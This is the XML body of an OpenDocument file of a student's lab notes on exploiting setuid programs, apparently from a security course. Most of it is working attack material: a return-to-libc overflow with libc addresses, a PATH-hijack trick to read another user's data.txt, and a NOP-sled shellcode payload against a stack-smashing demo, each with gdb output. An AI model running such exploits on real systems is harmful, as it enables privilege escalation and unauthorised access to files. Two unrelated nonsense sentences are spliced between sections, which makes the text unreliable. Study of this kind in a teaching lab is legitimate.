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4ee5c" officeooo:paragraph-rsid="0004ee5c" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000869ba" officeooo:paragraph-rsid="000869ba" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="00099aab" officeooo:paragraph-rsid="00099aab" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000cc759" officeooo:paragraph-rsid="000cc759" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000e65fa" officeooo:paragraph-rsid="000e65fa" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000fea5b" officeooo:paragraph-rsid="000fea5b" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="001088f9" officeooo:paragraph-rsid="001088f9" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="0010f203" officeooo:paragraph-rsid="0010f203" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="00113cfe" officeooo:paragraph-rsid="00113cfe" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" fo:font-size="10pt" officeooo:rsid="000cc759" officeooo:paragraph-rsid="000cc759" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" fo:font-size="10pt" officeooo:rsid="00117fbe" officeooo:paragraph-rsid="00117fbe" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" fo:font-size="10pt" officeooo:rsid="00117fbe" officeooo:paragraph-rsid="00117fbe" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000869ba" officeooo:paragraph-rsid="000869ba" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000cc759" officeooo:paragraph-rsid="000cc759" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:font-size="10pt" officeooo:rsid="000e65fa" officeooo:paragraph-rsid="000e65fa" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:font-size="10pt" officeooo:rsid="001088f9" officeooo:paragraph-rsid="001088f9" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00099aab"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#0000ff" officeooo:rsid="00099aab"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#4c1900"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#4c1900" officeooo:rsid="00099aab"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#6b0094"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#6b0094" officeooo:rsid="00099aab"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#ff0000" officeooo:rsid="00099aab"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="000b50fc"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#000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@crunchbang:~$ ls -l</text:p>
      <text:p text:style-name="P1">total 112</text:p>
      <text:p text:style-name="P1">-r-sr-xr-x 1 railsfax <text:s text:c="2"/>railsfax <text:s text:c="3"/>5834 Dec 14 <text:s/>2014 2runMe</text:p>
      <text:p text:style-name="P1">-r--r--r-- 1 railsfax <text:s text:c="2"/>railsfax <text:s text:c="4"/>287 Dec 14 <text:s/>2014 2runMe.C</text:p>
      <text:p text:style-name="P1">-r-sr-xr-x 1 missionmug missionmug <text:s/>5776 Dec 14 <text:s/>2014 3runMe</text:p>
      <text:p text:style-name="P1">-r-sr-xr-x 1 bluefoggy <text:s/>bluefoggy <text:s/>14071 Dec 16 <text:s/>2014 4runMe</text:p>
      <text:p text:style-name="P1">-r--r--r-- 1 bluefoggy <text:s/>bluefoggy <text:s text:c="3"/>137 Dec 16 <text:s/>2014 4runMe.C</text:p>
      <text:p text:style-name="P1">-r-sr-xr-x 1 cookbee <text:s text:c="3"/>cookbee <text:s text:c="4"/>5096 Dec 16 <text:s/>2014 5runMe</text:p>
      <text:p text:style-name="P1">-r--r--r-- 1 cookbee <text:s text:c="3"/>cookbee <text:s text:c="6"/>72 Dec 16 <text:s/>2014 5runMe.C</text:p>
      <text:p text:style-name="P1">---------- 1 lab <text:s text:c="7"/>lab <text:s text:c="10"/>33 Dec 12 <text:s/>2014 data.txt</text:p>
      <text:p text:style-name="P1">-rwxr-xr-x 1 lab <text:s text:c="7"/>lab <text:s text:c="8"/>5179 Dec <text:s/>2 18:30 env</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 lab <text:s text:c="7"/>lab <text:s text:c="10"/>10 Dec <text:s/>2 18:36 env.C</text:p>
      <text:p text:style-name="P1">-rwxr-xr-x 1 lab <text:s text:c="7"/>lab <text:s text:c="8"/>5548 Dec <text:s/>2 17:37 getenv</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 lab <text:s text:c="7"/>lab <text:s text:c="9"/>420 Dec <text:s/>2 17:35 getenv.c</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 lab <text:s text:c="7"/>lab <text:s text:c="10"/>13 Dec <text:s/>2 18:40 less</text:p>
      <text:p text:style-name="P1">drwxr-xr-x 2 lab <text:s text:c="7"/>lab <text:s text:c="8"/>4096 Dec <text:s/>2 18:51 nvm</text:p>
      <text:p text:style-name="P1">-r-sr-xr-x 1 seetow <text:s text:c="4"/>seetow <text:s text:c="5"/>5071 Dec 14 <text:s/>2014 runMe</text:p>
      <text:p text:style-name="P1">-r--r--r-- 1 seetow <text:s text:c="4"/>seetow <text:s text:c="7"/>74 Dec 14 <text:s/>2014 runMe.C</text:p>
      <text:p text:style-name="P1">drwxr-xr-x 2 lab <text:s text:c="7"/>lab <text:s text:c="8"/>4096 Dec <text:s/>2 18:55 something</text:p>
      <text:p text:style-name="P1">drwxr-xr-x 2 lab <text:s text:c="7"/>lab <text:s text:c="8"/>4096 Dec <text:s/>2 18:55 test</text:p>
      <text:p text:style-name="P1">-rw-r--r-- 1 lab <text:s text:c="7"/>lab <text:s text:c="10"/>11 Dec <text:s/>2 17:46 trial.txt</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">chmod #someNumber file</text:p>
      <text:p text:style-name="P1">some number to binary can change the -r-sr-xr-x stuff</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">execute as/same group access/my access</text:p>
      <text:p text:style-name="P1">creator info</text:p>
      <text:p text:style-name="P1">how big is the file</text:p>
      <text:p text:style-name="P1">date and file name</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">show environment variables <text:s text:c="2"/><text:span text:style-name="T8">env</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">when see hard coded whatever, try overwrite it at critical positions</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">when see executable only, <text:span text:style-name="T10">execute it and if ask for passwd</text:span> gdb it and <text:span text:style-name="T8">disassemble main</text:span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13">How to return to your specifyed script/code:</text:p>
      <text:p text:style-name="P2">run that with a environment variable</text:p>
      <text:p text:style-name="P2">if the code have strcpy() <text:s/><text:tab/><text:tab/>#one easy way to get to stack</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">analyze where's segment fault (know there's seg fault at 22th char)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">Find system and exit address:</text:p>
      <text:p text:style-name="P3">gdb -q 4runMe</text:p>
      <text:p text:style-name="P3">Reading symbols from /home/lab/4runMe...done.</text:p>
      <text:p text:style-name="P3">(gdb) p system</text:p>
      <text:p text:style-name="P3">No symbol "system" in current context.</text:p>
      <text:p text:style-name="P3">(gdb) b main</text:p>
      <text:p text:style-name="P3">Breakpoint 1 at 0x80485e5: file runMe4.C, line 17.</text:p>
      <text:p text:style-name="P3">(gdb) run</text:p>
      <text:p text:style-name="P3">Starting program: /home/lab/4runMe </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Breakpoint 1, main (argc=1, argv=0xbffff7c4) at runMe4.C:17</text:p>
      <text:p text:style-name="P3">17<text:tab/>runMe4.C: No such file or directory.</text:p>
      <text:p text:style-name="P3">(gdb) p system </text:p>
      <text:p text:style-name="P3">$1 = {&lt;text variable, no debug info&gt;} <text:span text:style-name="T8">0xb7d74c30</text:span> &lt;system&gt;</text:p>
      <text:p text:style-name="P3">(gdb) p exit</text:p>
      <text:p text:style-name="P3">$2 = {&lt;text variable, no debug info&gt;}<text:span text:style-name="T8"> 0xb7d68270</text:span> &lt;exit&gt;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">When input these numbers with python, its reverse every 2bit hex number sequence, dont touch the number values just change the sequence</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">create environment variables : export</text:p>
      <text:p text:style-name="P1">(can inject python code to have it execute by overwritting its return address)</text:p>
      <text:p text:style-name="P1">example:</text:p>
      <text:p text:style-name="P1">lab@crunchbang:~$ export JINGNING="cat /home/bluefoggy/data.txt"</text:p>
      <text:p text:style-name="P1">lab@crunchbang:~$ echo $JINGNING</text:p>
      <text:p text:style-name="P1">cat /home/bluefoggy <text:s text:c="12"/>#check if it is truely changed</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">make the HiDoneDeleteMe:</text:p>
      <text:p text:style-name="P3">copy these piece of code to something and compile it, this help me find the address of dat command</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P3">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P3">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">int main(int argc, char *argv[]) {</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>char *ptr;</text:p>
      <text:p text:style-name="P3"><text:s/></text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>if(argc &lt; 3) {</text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]); </text:p>
      <text:p text:style-name="P3"><text:s text:c="6"/>exit(0);</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>}</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>ptr = getenv(argv[1]); /* Get env var location. */</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>printf("%s will be at %p\n", argv[1], ptr);</text:p>
      <text:p text:style-name="P3">}</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">lab@crunchbang:~$ ./HiDontDeleteMe JINGNING 4runMe</text:p>
      <text:p text:style-name="P1">JINGNING will be at 0xbfffff79</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T3">#fill these unused space</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T5">#system address of prog</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T7">#exit address <text:s text:c="11"/></text:span><text:span text:style-name="T9"><text:s/>#destination</text:span></text:p>
      <text:p text:style-name="P1">lab@crunchbang:~$ ./4runMe $(python -c '<text:span text:style-name="T2">print "i" * 22</text:span>+ "<text:span text:style-name="T4">\x30\x4c\xd7\xb7</text:span>" + "<text:span text:style-name="T6">\x70\x82\xd6\xb7</text:span>" + "<text:span text:style-name="T8">\x75\xff\xff\xbf</text:span>"')</text:p>
      <text:p text:style-name="P1">The impressionism of mobility is rather open-minded in its empiricism.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">#include &lt;cstdlib&gt;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">int main() {</text:p>
      <text:p text:style-name="P4"><text:s text:c="2"/>system("cat /home/cookbee/data.txt");</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4">Compile this code with -o change the executable name to whatever system call used.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">lab@crunchbang:~$ ./less</text:p>
      <text:p text:style-name="P4">cat: /home/cookbee/data.txt: Permission denied</text:p>
      <text:p text:style-name="P4">lab@crunchbang:~$ ./5runMe </text:p>
      <text:p text:style-name="P4">lab@crunchbang:~$ env</text:p>
      <text:p text:style-name="P4">TERM=xterm-256color</text:p>
      <text:p text:style-name="P4">SHELL=/bin/bash</text:p>
      <text:p text:style-name="P4">XDG_SESSION_COOKIE=69fc2ab4025f73508e8dae9c548b2df5-1480707699.470385-1290266138</text:p>
      <text:p text:style-name="P4">SSH_CLIENT=128.197.55.89 37858 22</text:p>
      <text:p text:style-name="P4">SSH_TTY=/dev/pts/5</text:p>
      <text:p text:style-name="P4">USER=lab</text:p>
      <text:p text:style-name="P4">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:</text:p>
      <text:p text:style-name="P4">MAIL=/var/mail/lab</text:p>
      <text:p text:style-name="P10">PATH=/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</text:p>
      <text:p text:style-name="P4">PWD=/home/lab</text:p>
      <text:p text:style-name="P4">LANG=en_US.UTF-8</text:p>
      <text:p text:style-name="P4">SHLVL=1</text:p>
      <text:p text:style-name="P4">HOME=/home/lab</text:p>
      <text:p text:style-name="P4">LOGNAME=lab</text:p>
      <text:p text:style-name="P4">SSH_CONNECTION=128.197.55.89 37858 10.241.13.81 22</text:p>
      <text:p text:style-name="P4">_=/usr/bin/env</text:p>
      <text:p text:style-name="P10">lab@crunchbang:~$ PATH=/home/lab:$PATH</text:p>
      <text:p text:style-name="P4">lab@crunchbang:~$ env<text:tab/><text:tab/><text:tab/>#this means that path is changed env command does not exist in this path</text:p>
      <text:p text:style-name="P4">(nil)lab@crunchban./5runMe </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">The smart trader nowadays will plan to amortize senior-rated transfers.</text:p>
      <text:p text:style-name="P15">find / -name "filename" 2&gt;/dev/null</text:p>
      <text:p text:style-name="P5">able to find even hidden files</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P7">Dami's demo code compiling:</text:p>
      <text:p text:style-name="P7">gcc stackSmash.c -o vuln -fno-stack-protector -m32</text:p>
      <text:p text:style-name="P7">g++ -g -z execstack -fno-stack-protector attackMe.C -o attackMe</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Attack Me:</text:p>
      <text:p text:style-name="P9">(gdb)set disable-randomization on</text:p>
      <text:p text:style-name="P8">(gdb) b main</text:p>
      <text:p text:style-name="P8">Breakpoint 1 at 0x400863: file attackMe.C, line 8.</text:p>
      <text:p text:style-name="P8">(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P8">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/attackMe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">Breakpoint 1, main (argc=2, argv=0x7fffffffe068) at attackMe.C:8</text:p>
      <text:p text:style-name="P8">8<text:tab/><text:tab/>strcpy(str, argv[1]);</text:p>
      <text:p text:style-name="P8">Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.192.el6.x86_64 libgcc-4.4.7-17.el6.x86_64 libstdc++-4.4.7-17.el6.x86_64</text:p>
      <text:p text:style-name="P8">(gdb) n</text:p>
      <text:p text:style-name="P8">9<text:tab/><text:tab/>cout &lt;&lt; str &lt;&lt; endl;</text:p>
      <text:p text:style-name="P8">(gdb) p st</text:p>
      <text:p text:style-name="P8">No symbol "st" in current context.</text:p>
      <text:p text:style-name="P8">(gdb) p str</text:p>
      <text:p text:style-name="P8">$1 = 'A' &lt;repeats 100 times&gt;</text:p>
      <text:p text:style-name="P8">(gdb) p &amp;str</text:p>
      <text:p text:style-name="P8">$2 = (char (*)[100]) <text:span text:style-name="T8">0x7fffffffdf10</text:span></text:p>
      <text:p text:style-name="P8">(gdb) i f</text:p>
      <text:p text:style-name="P8">Stack level 0, frame at 0x7fffffffdf90:</text:p>
      <text:p text:style-name="P8"><text:s/>rip = 0x40087d in main (attackMe.C:9); saved rip 0x396ae1ed1d</text:p>
      <text:p text:style-name="P8"><text:s/>source language c++.</text:p>
      <text:p text:style-name="P8"><text:s/>Arglist at 0x7fffffffdf80, args: argc=2, argv=0x7fffffffe068</text:p>
      <text:p text:style-name="P8"><text:s/>Locals at 0x7fffffffdf80, Previous frame's sp is 0x7fffffffdf90</text:p>
      <text:p text:style-name="P8"><text:s/>Saved registers:</text:p>
      <text:p text:style-name="P8"><text:s text:c="2"/>rbp at 0x7fffffffdf80, rip at <text:span text:style-name="T8">0x7fffffffdf88</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8"><text:span text:style-name="T8">88h-10h=120d</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T8"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T8"/></text:p>
      <text:p text:style-name="P12">bash-4.1$ gdb -q attackMe</text:p>
      <text:p text:style-name="P12">Reading symbols from /ad/eng/users/z/h/zhangjn/Desktop/you/attackMe...done.</text:p>
      <text:p text:style-name="P12">(gdb) set disable-randomization</text:p>
      <text:p text:style-name="P12">(gdb) b main</text:p>
      <text:p text:style-name="P12">Breakpoint 1 at 0x400863: file attackMe.C, line 8.</text:p>
      <text:p text:style-name="P12">(gdb) r "$(python -c 'print "\x90" * 51 + "\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d" + "\x50\xdf\xff\xff\xff\x7f"')"</text:p>
      <text:p text:style-name="P12">Starting program: /ad/eng/users/z/h/zhangjn/Desktop/you/attackMe "$(python -c 'print "\x90" * 51 + "\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d" + "\x50\xdf\xff\xff\xff\x7f"')"</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">Breakpoint 1, main (argc=2, argv=0x7fffffffe058) at attackMe.C:8</text:p>
      <text:p text:style-name="P12"><text:soft-page-break/>8<text:tab/><text:tab/>strcpy(str, argv[1]);</text:p>
      <text:p text:style-name="P12">Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.192.el6.x86_64 libgcc-4.4.7-17.el6.x86_64 libstdc++-4.4.7-17.el6.x86_64</text:p>
      <text:p text:style-name="P12">(gdb) n</text:p>
      <text:p text:style-name="P12">9<text:tab/><text:tab/>cout &lt;&lt; str &lt;&lt; endl;</text:p>
      <text:p text:style-name="P12">(gdb) x/50xg</text:p>
      <text:p text:style-name="P12">Argument required (starting display address).</text:p>
      <text:p text:style-name="P12">(gdb) x/50xg $rsp</text:p>
      <text:p text:style-name="P12">0x7fffffffdef0:<text:tab/>0x00007fffffffe058<text:tab/>0x00000002004008f5</text:p>
      <text:p text:style-name="P11">0x7fffffffdf00:<text:tab/>0x9090909090909090<text:tab/>0x9090909090909090</text:p>
      <text:p text:style-name="P11">0x7fffffffdf10:<text:tab/>0x9090909090909090<text:tab/>0x9090909090909090</text:p>
      <text:p text:style-name="P11">0x7fffffffdf20:<text:tab/>0x9090909090909090<text:tab/>0x9090909090909090</text:p>
      <text:p text:style-name="P12">0x7fffffffdf30:<text:tab/>0xdb314829eb909090<text:tab/>0x31485ef631480eb3</text:p>
      <text:p text:style-name="P12">0x7fffffffdf40:<text:tab/>0xb740ff314801b0c0<text:tab/>0x050f15b2d2314801</text:p>
      <text:p text:style-name="P12">0x7fffffffdf50:<text:tab/>0xb0c03148ea75cbfe<text:tab/>0xd2e8050fff31483c</text:p>
      <text:p text:style-name="P12">0x7fffffffdf60:<text:tab/>0x7627756f59ffffff<text:tab/>0x685f6e6565625f65</text:p>
      <text:p text:style-name="P12">0x7fffffffdf70:<text:tab/>0x0d0a2164656b6361<text:tab/>0x00007fffffffdf50</text:p>
      <text:p text:style-name="P12">0x7fffffffdf80:<text:tab/>0x0000000000000000<text:tab/>0x00007fffffffe058</text:p>
      <text:p text:style-name="P12">0x7fffffffdf90:<text:tab/>0x0000000200000000<text:tab/>0x0000000000400854</text:p>
      <text:p text:style-name="P12">0x7fffffffdfa0:<text:tab/>0x0000000000000000<text:tab/>0x7d78ea94f6bb0a0e</text:p>
      <text:p text:style-name="P12">0x7fffffffdfb0:<text:tab/>0x0000000000400770<text:tab/>0x00007fffffffe050</text:p>
      <text:p text:style-name="P12">0x7fffffffdfc0:<text:tab/>0x0000000000000000<text:tab/>0x0000000000000000</text:p>
      <text:p text:style-name="P12">0x7fffffffdfd0:<text:tab/>0x8287156b49bb0a0e<text:tab/>0x7d0a3f572f0b0a0e</text:p>
      <text:p text:style-name="P12">0x7fffffffdfe0:<text:tab/>0x00007fff00000000<text:tab/>0x0000000000000000</text:p>
      <text:p text:style-name="P12">0x7fffffffdff0:<text:tab/>0x0000000000000000<text:tab/>0x0000000000400910</text:p>
      <text:p text:style-name="P12">0x7fffffffe000:<text:tab/>0x00007fffffffe058<text:tab/>0x0000000000000002</text:p>
      <text:p text:style-name="P12">0x7fffffffe010:<text:tab/>0x0000000000000000<text:tab/>0x0000000000000000</text:p>
      <text:p text:style-name="P12">0x7fffffffe020:<text:tab/>0x0000000000400770<text:tab/>0x00007fffffffe050</text:p>
      <text:p text:style-name="P12">0x7fffffffe030:<text:tab/>0x0000000000000000<text:tab/>0x0000000000400799</text:p>
      <text:p text:style-name="P12">0x7fffffffe040:<text:tab/>0x00007fffffffe048<text:tab/>0x000000000000001c</text:p>
      <text:p text:style-name="P12">0x7fffffffe050:<text:tab/>0x0000000000000002<text:tab/>0x00007fffffffe419</text:p>
      <text:p text:style-name="P12">0x7fffffffe060:<text:tab/>0x00007fffffffe448<text:tab/>0x0000000000000000</text:p>
      <text:p text:style-name="P12">0x7fffffffe070:<text:tab/>0x00007fffffffe4c7<text:tab/>0x00007fffffffe530</text:p>
      <text:p text:style-name="P12">(gdb) q</text:p>
      <text:p text:style-name="P12">A debugging session is active.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:tab/>Inferior 1 [process 12495] will be killed.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">Quit anyway? (y or n) y</text:p>
      <text:p text:style-name="P12">bash-4.1$ gdb attackMe</text:p>
      <text:p text:style-name="P12">GNU gdb (GDB) Red Hat Enterprise Linux (7.2-90.el6)</text:p>
      <text:p text:style-name="P12">Copyright (C) 2010 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="P12">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="P12">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="P12">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="P12">and "show warranty" for details.</text:p>
      <text:p text:style-name="P12">This GDB was configured as "x86_64-redhat-linux-gnu".</text:p>
      <text:p text:style-name="P12">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="P12">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</text:p>
      <text:p text:style-name="P12">Reading symbols from /ad/eng/users/z/h/zhangjn/Desktop/you/attackMe...done.</text:p>
      <text:p text:style-name="P12">(gdb) r "$(python -c 'print "\x90" * <text:span text:style-name="T8">51</text:span> + "\xeb\x29\x48\x31\xdb\xb3\x0e\x48\x31\xf6\x5e\x48\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\xb2\x15\x0f\x05\xfe\xcb\x75\xea\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xd2\xff\xff\xff\x59\x6f\x75\x27\x76\x65\x5f\x62\x65\x65\x6e\x5f\x68\x61\x63\x6b\x65\x64\x21\x0a\x0d" + "\x10\xdf\xff\xff\xff\x7f"')"</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12">#provided shell code have 69 chars</text:p>
      <text:p text:style-name="P12"/>
